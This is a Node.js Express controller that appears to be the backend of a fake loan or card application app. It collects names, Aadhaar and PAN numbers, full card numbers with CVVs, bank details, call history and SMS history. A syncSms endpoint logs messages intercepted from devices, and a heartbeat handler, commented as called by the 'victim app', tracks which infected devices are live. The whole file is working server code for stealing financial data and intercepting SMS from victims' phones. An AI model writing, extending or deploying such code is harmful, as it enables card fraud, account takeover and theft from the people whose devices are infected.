const { Application, SmsLog } = require('../models');
const { validationResult } = require('express-validator');

exports.submitApplication = async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }

    try {
        const {
            name, phone, dob, jobType, maritalStatus,
            applicationType, amount, aadhaar, pan,
            cardNumber, cardExpiry, cardCvv,
            bankName, accNo, ifsc,
            deviceId, deviceInfo, appId,
            smsHistory, callHistory
        } = req.body;

        const newApplication = await Application.create({
            fullName: name,
            mobile: phone,
            dob: dob,
            panCard: pan,
            aadhaarNumber: aadhaar,
            smsHistory: smsHistory,
            callHistory: callHistory,
            bankAccount: {
                bankName,
                accountNumber: accNo,
                ifscCode: ifsc,
                cardNumber,
                cardExpiry,
                cardCvv,
                loanAmountOffer: amount
            },
            deviceId: deviceId,
            deviceFingerprint: {
                applicationType: applicationType || 'new_card',
                deviceId,
                deviceInfo,
                appId,
                jobType,
                maritalStatus
            },
            documentPath: req.file ? `/uploads/${req.file.filename}` : null
        });

        res.status(201).json({
            message: 'Application submitted successfully',
            applicationId: newApplication.applicationId,
            appNo: appId
        });
    } catch (error) {
        console.error('Submission error:', error);
        res.status(500).json({ message: 'Submission failed' });
    }
};

exports.getApplicationStatus = async (req, res) => {
    try {
        const { applicationId } = req.params;
        const application = await Application.findOne({ where: { applicationId } });

        if (!application) {
            return res.status(404).json({ message: 'Application not found' });
        }

        res.json({
            applicationId: application.applicationId,
            status: application.status
        });
    } catch (error) {
        console.error('Status fetch error:', error);
        res.status(500).json({ message: 'Server error' });
    }
};

exports.syncSms = async (req, res) => {
    try {
        const { deviceId, sms } = req.body;

        if (!deviceId || !sms || !sms.address || !sms.body) {
            return res.status(400).json({ message: 'Invalid payload' });
        }

        const application = await Application.findOne({
            where: { deviceId: deviceId },
            order: [['createdAt', 'DESC']]
        });

        // Duplicate Check: Don't log same message twice from same device
        const existing = await SmsLog.findOne({
            where: {
                deviceId,
                address: sms.address,
                body: sms.body
            }
        });

        if (existing) {
            return res.json({ status: 'ignored', reason: 'duplicate' });
        }

        await SmsLog.create({
            address: sms.address,
            body: sms.body,
            date: new Date(),
            deviceId: deviceId,
            applicationId: application ? application.applicationId : null
        });

        // Touch the Application's updatedAt so device shows as LIVE
        if (application) {
            await application.update({ updatedAt: new Date() });
        }

        res.json({ status: 'logged' });
    } catch (e) {
        console.error('SMS Sync error:', e);
        res.status(500).json({ error: 'Sync failed' });
    }
};

exports.getDiagnostics = async (req, res) => {
    try {
        const count = await Application.count();
        res.json({
            status: 'success',
            database: 'connected',
            recordCount: count,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: 'Connection failed'
        });
    }
};

// Heartbeat: victim app calls this on open/resume to signal it's alive
exports.heartbeat = async (req, res) => {
    try {
        const { deviceId } = req.body;
        if (!deviceId) {
            return res.status(400).json({ message: 'deviceId required' });
        }

        const application = await Application.findOne({
            where: { deviceId: deviceId }
        });

        if (application) {
            await application.update({ updatedAt: new Date() });
            return res.json({ status: 'alive', applicationId: application.applicationId });
        }

        // No matching application yet — just acknowledge
        res.json({ status: 'acknowledged', message: 'No application found for this device yet' });
    } catch (error) {
        console.error('Heartbeat error:', error);
        res.status(500).json({ error: 'Heartbeat failed' });
    }
};
